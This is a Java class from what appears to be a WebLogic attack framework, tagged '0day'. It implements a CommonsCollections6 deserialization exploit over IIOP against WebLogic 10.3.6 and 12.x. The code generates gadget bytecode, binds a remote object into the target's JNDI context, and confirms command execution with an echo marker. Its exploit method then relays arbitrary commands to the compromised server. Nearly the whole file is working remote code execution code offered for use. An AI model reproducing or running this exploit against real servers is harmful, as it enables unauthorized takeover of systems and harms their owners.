package com.weblogic.framework.payloads.impl;

import com.weblogic.framework.annotation.Authors;
import com.weblogic.framework.annotation.Dependencies;
import com.weblogic.framework.annotation.Tags;
import com.weblogic.framework.annotation.Versions;
import com.weblogic.framework.entity.ContextPojo;
import com.weblogic.framework.gadget.ObjectPayload;
import com.weblogic.framework.gadget.impl.CommonsCollections6Gadget;
import com.weblogic.framework.payloads.VulTest;
import com.weblogic.framework.utils.VulUtils;
import javassist.ClassPool;
import javassist.CtClass;
import weblogic.cluster.singleton.ClusterMasterRemote;
import javax.naming.Context;
import java.io.Serializable;
import java.net.URL;
import java.rmi.Remote;
import static com.weblogic.framework.config.CharsetConfig.defaultCharsetName;
import static com.weblogic.framework.utils.CallUtils.CALL_MAP;
import static com.weblogic.framework.utils.CallUtils.callExec;
import static com.weblogic.framework.utils.ContextUtils.rebind;
import static com.weblogic.framework.utils.StringUtils.getRandomString;
import static com.weblogic.framework.utils.UrlUtils.checkUrl;
import static com.weblogic.framework.utils.VersionUtils.checkVersion;
import static com.weblogic.framework.utils.VersionUtils.getVersion;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CommonsCollections6
 * Desc: CommonsCollections6
 * Date:2020/4/5 3:48
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":JtaTransactionManager"})
@Versions({"10.3.6.0", "12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
@Tags({"0day"})
public class CommonsCollections6 implements VulTest {

    /**
     * 漏洞影响版本
     */
    private static final String[] VUL_VERSIONS = new String[]{"10.3.6.0", "10.3.6.0.0", "12.1.3.0", "12.1.3.0.0"};

    /**
     * remote
     */
    private Object remote = null;

    /**
     * bindName
     */
    private String bindName = "";

    /**
     * current context
     */
    private Context currentContext = null;


    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param url url
     * @param param 执行参数
     * @return 漏洞存在返回 true 否则返回 false
     * @throws Exception 抛出异常
     */
    @Override
    public Boolean vulnerable(String url, String... param) throws Exception {
        url = checkUrl(url);
        URL checkURL = new URL(url);
        String ip = checkURL.getHost();
        Integer port = checkURL.getPort() == -1 ? checkURL.getDefaultPort():checkURL.getPort();
        String version = getVersion(ip, port);
        version = version.replace(".0.0",".0");
        Boolean flag = checkVersion(version, VUL_VERSIONS);
        if(!flag){
            return false;
        }
        String charsetName = "";
        String callName = ClusterMasterRemote.class.getSimpleName();
        if(param.length > 3){
            charsetName = param[2];
            callName = param[3];
        }
        if(isBlank(charsetName)){
            charsetName = defaultCharsetName;
        }
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        bindName = getRandomString(16);
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass =  pool.get(callClazz.getName());
        if(ctClass.isFrozen()){
            ctClass.defrost();
        }
        ctClass.setName(callClazz.getSimpleName());
        byte[] bytes = ctClass.toBytecode();
        ctClass.defrost();
        ObjectPayload<Serializable> objectPayload = new CommonsCollections6Gadget();
        Object object = objectPayload.getObject(bytes,new String[]{bindName}, callClazz.getSimpleName(),null);
        ContextPojo contextPojo = null;
        String iiopUrl = String.format("iiop://%s:%s", ip, port);
        try{
            contextPojo = rebind(iiopUrl, object, null);
        }catch (Exception e){
            e.printStackTrace();
        }
        if(contextPojo == null || contextPojo.getContext() == null){
            return false;
        }
        Context context = contextPojo.getContext();
        System.out.println("[*] bind name --> "+bindName+" ok !");
        try{
            Object objectCall = context.lookup(bindName);
            this.currentContext = context;
            this.remote = objectCall;
            String cmd = "echo a136d86442181f45a4446f5fb8a49f7f";
            cmd += "@@"+charsetName+"####"+ip+":"+port;
            String rsp = callExec(cmd,objectCall);
            return rsp.contains("a136d86442181f45a4446f5fb8a49f7f");
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }finally {
            System.gc();
        }
    }

    /**
     * 漏洞利用
     *
     * @param url url
     * @param param 利用参数
     * @throws Exception 抛出异常
     */
    @Override
    public String exploit(String url, String... param) throws Exception {
        return VulUtils.exploit(url, remote, param);
    }

    public static void main(String[] args) throws Exception {
        CommonsCollections6 commonsCollections6 = new CommonsCollections6();
        Boolean flag = commonsCollections6.vulnerable("http://192.168.1.10:7001//console/login/LoginForm.jsp");
        System.out.println(flag);
    }
}
